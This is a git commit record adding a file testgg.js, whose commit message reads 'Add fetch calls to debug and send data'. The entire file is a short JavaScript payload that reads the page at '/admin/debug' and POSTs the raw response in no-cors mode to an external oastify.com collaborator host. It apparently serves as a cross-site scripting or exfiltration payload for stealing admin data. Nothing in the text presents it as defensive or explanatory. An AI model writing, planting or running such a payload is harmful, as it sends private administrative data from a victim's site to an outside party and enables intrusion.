5fd8c42502a009eb192ffcbbc2bb4dbfeebde629
D3V1LKKW <40319904+D3V1LKKW@users.noreply.github.com>
2026-02-22 20:17:24 +0700

    Add fetch calls to debug and send data

---
+++ testgg.js
@@ -0,0 +1,9 @@
+fetch('/admin/debug')
+  .then(r => r.text())
+  .then(d => {
+    fetch('https://nwnxtlyl0wtbphmg9f543jm9r0xrllq9f.oastify.com/', {
+      method: 'POST',
+      mode: 'no-cors',
+      body: d // Raw data, no encoding needed
+    });
+  });
